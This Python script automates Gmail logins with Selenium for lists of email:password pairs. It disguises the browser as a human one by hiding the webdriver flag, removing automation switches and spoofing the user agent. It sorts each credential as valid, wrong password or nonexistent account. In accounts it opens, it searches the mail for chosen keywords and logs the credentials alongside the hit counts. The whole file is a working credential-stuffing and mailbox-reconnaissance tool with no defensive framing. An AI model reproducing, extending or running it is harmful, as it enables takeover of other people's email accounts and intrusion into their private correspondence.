import time
import re
import dns.resolver
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import os

def validate_email_syntax(email, log_callback=None):
    """Validate email syntax using a regular expression."""
    # Regex for email: allows letters, numbers, dots, hyphens, etc. in local part,
    # and a domain with at least one dot and a TLD
    email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if re.match(email_regex, email):
        return True
    if log_callback:
        log_callback(f"[ERROR] Invalid email syntax: {email}")
    return False

def check_mx_records(email, log_callback=None):
    """Check if the email's domain has valid MX records."""
    try:
        domain = email.split('@')[1]
        answers = dns.resolver.resolve(domain, 'MX')
        if answers:
            if log_callback:
                log_callback(f"[INFO] Valid MX records found for {domain}")
            return True
        if log_callback:
            log_callback(f"[ERROR] No MX records found for {domain}")
        return False
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers, dns.resolver.Timeout) as e:
        if log_callback:
            log_callback(f"[ERROR] MX record check failed for {email}: {str(e)}")
        return False
    except Exception as e:
        if log_callback:
            log_callback(f"[ERROR] Unexpected error during MX record check for {email}: {str(e)}")
        return False

def login_to_gmail(email_address, password, headless=False, log_callback=None):
    driver = None
    try:
        # Set up Chrome options
        chrome_options = Options()
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36")
        chrome_options.add_argument("--window-size=1920,1080")
        if headless:
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--disable-webgl")
            chrome_options.add_argument("--disable-features=TensorFlowLite")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option("useAutomationExtension", False)

        # Initialize WebDriver
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        wait = WebDriverWait(driver, 20)

        if log_callback:
            log_callback(f"[INFO] Navigating to Gmail login page for {email_address}")

        # Go to Gmail login page
        driver.get("https://mail.google.com/")
        wait.until(EC.presence_of_element_located((By.ID, "identifierId")))

        # Enter email
        driver.find_element(By.ID, "identifierId").send_keys(email_address + Keys.RETURN)
        time.sleep(3)

        # Check for invalid email
        try:
            wait.until(EC.presence_of_element_located((By.CLASS_NAME, "Ekjuhf")))
            error_message = driver.find_element(By.CLASS_NAME, "Ekjuhf").text
            if "Couldn’t find your Google Account" in error_message:
                if log_callback:
                    log_callback(f"[ERROR] Invalid email: {email_address}")
                driver.quit()
                return "invalid_email"
        except:
            pass

        # Wait for password field
        wait.until(EC.presence_of_element_located((By.NAME, "Passwd")))

        # Enter password
        driver.find_element(By.NAME, "Passwd").send_keys(password + Keys.RETURN)
        time.sleep(5)

        # Check for invalid password
        try:
            wait.until(EC.presence_of_element_located((By.CLASS_NAME, "Ly8vae")))
            error_message = driver.find_element(By.CLASS_NAME, "Ly8vae").text
            if "Wrong password" in error_message:
                if log_callback:
                    log_callback(f"[ERROR] Invalid password for: {email_address}")
                driver.quit()
                return "invalid_password"
        except:
            pass

        # Check if login was successful
        if "myaccount" in driver.current_url or "mail" in driver.current_url:
            if log_callback:
                log_callback(f"[SUCCESS] Logged in: {email_address}")
            return driver
        else:
            if log_callback:
                log_callback(f"[FAILED] Unexpected post-login page for: {email_address}")
            driver.quit()
            return None

    except Exception as e:
        if log_callback:
            log_callback(f"[EXCEPTION] Login failed for {email_address}: {str(e)}")
        if driver:
            driver.quit()
        return None

def search_gmail(driver, keyword, log_callback=None):
    try:
        wait = WebDriverWait(driver, 20)
        search_field = wait.until(EC.presence_of_element_located(
            (By.CSS_SELECTOR, 'input[name="q"]')
        ))

        search_field.clear()
        search_field.send_keys(keyword)
        if log_callback:
            log_callback(f"[INFO] Searching for keyword: {keyword}")
        search_field.send_keys(Keys.RETURN)

        time.sleep(10)

        result_count = get_result_count_using_js(driver, log_callback)
        if log_callback:
            log_callback(f"[INFO] Total results for '{keyword}': {result_count}")
        return result_count

    except Exception as e:
        if log_callback:
            log_callback(f"[ERROR] Could not search for keyword {keyword}: {e}")
        return 0

def get_result_count_using_js(driver, log_callback=None):
    try:
        no_results = driver.execute_script("""
            var noResultsElement = document.querySelector('td.TC');
            if (noResultsElement && noResultsElement.innerText.includes('No messages matched your search')) {
                return 'no_results';
            }
            return null;
        """)

        if no_results == 'no_results':
            if log_callback:
                log_callback("[INFO] No messages matched the search.")
            return 0

        result_count = driver.execute_script("""
            var resultElement = document.querySelector('div[role="button"][aria-label="Show more messages"] span.Dj span.ts:last-child') || 
                               document.querySelector('div[role="button"][aria-label="Show more messages"] span.Dj span.ts') || 
                               document.querySelector('span.Dj span.ts') || 
                               document.querySelector('span[jsname="LgbsSe"]');
            if (resultElement) {
                return resultElement.innerText;
            }
            return null;
        """)

        if log_callback:
            log_callback(f"[DEBUG] Raw JavaScript Result Count: {result_count}")

        if result_count:
            match = re.search(r'(\d+)\s*–\s*(\d+)\s*of\s*(\d+|\w+)', result_count)
            if match:
                start_count = int(match.group(1))
                end_count = int(match.group(2))
                total_results = match.group(3)

                if total_results == "many":
                    if log_callback:
                        log_callback(f"[INFO] Total results for {result_count}: many (too large to count)")
                    return "many"
                else:
                    if log_callback:
                        log_callback(f"[INFO] Total results from {start_count}-{end_count}: {total_results}")
                    return int(total_results)
            else:
                match = re.search(r'^\d+$', result_count)
                if match:
                    total_results = int(match.group(0))
                    if log_callback:
                        log_callback(f"[INFO] Total results (single number): {total_results}")
                    return total_results
                if log_callback:
                    log_callback("[INFO] Could not parse result count range from the raw value.")
                return 0
        else:
            if log_callback:
                log_callback("[INFO] Result count not found using JavaScript.")
            return 0
    except Exception as e:
        if log_callback:
            log_callback(f"[ERROR] Could not extract result count using JavaScript: {e}")
        return 0

def process_email_account(email, password, keywords, output_dir, headless=False, log_callback=None):
    # Validate email syntax
    if not validate_email_syntax(email, log_callback):
        output_path = os.path.join(output_dir, "results.txt")
        with open(output_path, "a") as f:
            f.write(f"{email}:{password} | invalid email syntax\n")
        if log_callback:
            log_callback(f"[SKIP] Skipping {email} due to invalid email syntax")
        return

    # Check MX records
    if not check_mx_records(email, log_callback):
        output_path = os.path.join(output_dir, "results.txt")
        with open(output_path, "a") as f:
            f.write(f"{email}:{password} | no valid MX records\n")
        if log_callback:
            log_callback(f"[SKIP] Skipping {email} due to no valid MX records")
        return

    # Proceed with login
    result = login_to_gmail(email, password, headless, log_callback)
    
    # Write to results.txt for all cases
    output_path = os.path.join(output_dir, "results.txt")
    with open(output_path, "a") as f:
        if result == "invalid_email":
            f.write(f"{email}:{password} | invalid email\n")
            if log_callback:
                log_callback(f"[SKIP] Skipping {email} due to invalid email")
            return
        elif result == "invalid_password":
            f.write(f"{email}:{password} | invalid password\n")
            if log_callback:
                log_callback(f"[SKIP] Skipping {email} due to invalid password")
            return
        elif result is None:
            f.write(f"{email}:{password} | login failed\n")
            if log_callback:
                log_callback(f"[SKIP] Skipping {email} due to login failure")
            return

        # Proceed with search if login was successful
        driver = result
        results = []
        for keyword in keywords:
            result_count = search_gmail(driver, keyword, log_callback)
            results.append(f"{email}:{password} | {keyword} = {result_count}")
            f.write(f"{email}:{password} | {keyword} = {result_count}\n")
        
        driver.quit()
        if log_callback:
            log_callback(f"[INFO] Results saved to {output_path}")

def run_search(credentials, keywords, output_dir, headless=False, log_callback=None):
    for email, password in credentials:
        if log_callback:
            log_callback(f"\n>> Trying login for {email}")
        process_email_account(email, password, keywords, output_dir, headless, log_callback)
        time.sleep(5)